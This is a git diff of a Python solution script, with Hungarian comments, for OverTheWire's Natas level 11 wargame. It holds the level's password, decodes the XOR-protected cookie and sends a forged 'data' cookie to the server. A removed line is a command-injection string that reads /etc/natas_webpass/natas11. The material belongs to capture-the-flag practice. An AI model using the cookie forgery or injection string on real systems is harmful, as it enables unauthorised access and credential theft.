@@ -1,35 +1,44 @@
-from urllib import response
-
 #3.9 pythonnal megy!!
-import urllib
+from urllib.parse import unquote
 import requests
 import re
 import base64
 
-from traitlets import default
-
-
 username = 'natas11'
 password = '1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg'
 
-goodCookieData = { "data" : "MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz"}
+
 #headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}
 url = 'http://%s.natas.labs.overthewire.org/' % username
-session = requests.Session()
-reponse = session.get(url , auth=(username, password),cookies=goodCookieData)
 
-#POST request
-#reponse = requests.post(url, data={"needle": ". cat /etc/natas_webpass/natas11 #","submit": "submit"}, auth=(username, password))
-
-#a sessionhoz hozzarendelt get keres
-#reponse = session.get(url, auth=(username, password), cookies=cookie_)
-
+reponse = requests.get(url , auth=(username, password))
 content = reponse.text
+print(content)
 
-#indexelni is lehet
-#print(session.cookies['loggedin'])
+#A sütik XOR kódolással vannak védve. Nézzük meg a kódot.
 
-#kereses a tartalomban. A (.*) a helyettesito karakter. ami itt van az eredetiban azt figyelman kivul fogja hagyni.
-#print(re.findall('natas11(.*)' ,content))
+url = 'http://%s.natas.labs.overthewire.org/' % username
 
+reponse = requests.get(url , auth=(username, password))
+content = reponse.text
+print(content)
+
+#Irassuk ki a süti tartalmát is
+
+print('')
+print('Süti kiratása')
+url = 'http://%s.natas.labs.overthewire.org/' % username
+
+sess = requests.session()
+reponse = sess.get(url , auth=(username, password))
+content = reponse.text
+print(base64.b64decode(unquote(sess.cookies['data'])).hex())
+
+Payload = {"data" : "MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz"}
+
+
+url = 'http://%s.natas.labs.overthewire.org/' % username
+session = requests.Session()
+reponse = session.get(url , auth=(username, password),cookies=Payload)
+content = reponse.text
 print(content)
